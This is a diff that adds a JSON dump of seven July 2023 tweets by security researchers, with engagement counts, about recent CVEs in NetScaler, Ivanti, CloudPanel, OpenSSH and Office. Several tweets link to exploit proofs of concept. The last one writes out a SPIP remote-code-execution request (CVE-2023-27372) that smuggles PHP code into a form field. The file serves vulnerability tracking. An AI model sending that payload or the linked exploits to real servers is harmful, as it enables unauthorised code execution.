@@ -1,0 +1,82 @@
+{
+    "tweetfavorites": 251,
+    "tweetquotes": 3,
+    "tweetreplies": 14,
+    "tweetretweets": 63,
+    "tweettext": "- Citrix NetScaler runs on FreeBSD.\n- FreeBSD still doesn't have ASLR because \"there's a million ways to defeat it.\" (The not-yet released version 14 apparently has it on by default)\n- CVE-2023-3519 is a memory corruption vulnerability.\n\nPlease think about this combo of facts.\n🤔 https://t.co/zzOb65th4o",
+    "tweettime": "2023-07-29, 14:16:49",
+    "tweeturl": "https://twitter.com/wdormann/status/1685293302180982784",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://raw.githubusercontent.com/vchan-in/CVE-2023-35078-Exploit-POC/main/cve_2023_35078_poc.py"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 40,
+    "tweettext": "CVE-2023-35078 - Remote Unauthenticated API Access Vulnerability Exploit POC\nhttps://t.co/FIXr27Ss1e",
+    "tweettime": "2023-07-29, 13:59:20",
+    "tweeturl": "https://twitter.com/momika233/status/1685288901848797185",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/datackmy/FallingSkies-CVE-2023-35885"
+    ],
+    "tweetfavorites": 123,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 34,
+    "tweettext": "CVE-2023-35885\nCloudpanel 0-day Exploit\nhttps://t.co/sI4ZuaVWgF",
+    "tweettime": "2023-07-28, 08:14:05",
+    "tweeturl": "https://twitter.com/momika233/status/1684839629630136320",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh-forwarded-ssh-agent.txt"
+    ],
+    "tweetfavorites": 128,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 41,
+    "tweettext": "CVE-2023-38408 Openssh-RCE\nhttps://t.co/cvC0xlBMV1",
+    "tweettime": "2023-07-22, 01:18:46",
+    "tweeturl": "https://twitter.com/momika233/status/1682560787087503360",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 9,
+    "tweettext": "So if I remember it correctly, the CVE-2021-40444, CVE-2022–30190, and now the CVE-2023-36884 are all zero-day attacks because of \"Office loading IE engine\", it really tells that the hidden-but-not-really-killed IE sitting in Windows is only for zero-day purposes, right, right??",
+    "tweettime": "2023-07-12, 23:28:12",
+    "tweeturl": "https://twitter.com/HaifeiLi/status/1679271469044609024",
+    "username": "HaifeiLi"
+}
+{
+    "expanded_url": [
+        "https://www.virustotal.com/gui/file/a61b2eafcf39715031357df6b01e85e0d1ea2e8ee1dfec241b114e18f7a1163f/detection"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 20,
+    "tweettext": "According to MS blogpost, I found this sample on VT. Saw some weird things such as a \".url\" and a \".xml\" file \"linked\". However I wasn't able to reproduce in an Office 2021 env (I'm running out of VMs!).  Let me know if anyone succeeds.\n\nhttps://t.co/ZGoGj6MhG2\n\n#CVE-2023-36884",
+    "tweettime": "2023-07-12, 02:12:46",
+    "tweeturl": "https://twitter.com/HaifeiLi/status/1678950495778668545",
+    "username": "HaifeiLi"
+}
+{
+    "tweetfavorites": 114,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 35,
+    "tweettext": "SPIP RCE CVE-2023-27372 #BugBounty \nPost:\nhxxp://host/spip.php?page=spip_pass\ndata:\npage=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=E1nK0hfOPllDtCUbG6L94SlEpZi7Vz17IKUbf0ZB6ET0WbEHeXrw9tNNCEWjm0ac0%2F4DuboKIZvygjRh&amp;oubli=s:19:\"&lt;?php phpinfo(); ?&gt;\";&amp;nobot=",
+    "tweettime": "2023-07-10, 14:05:26",
+    "tweeturl": "https://twitter.com/momika233/status/1678405071200047116",
+    "username": "momika233"
+}
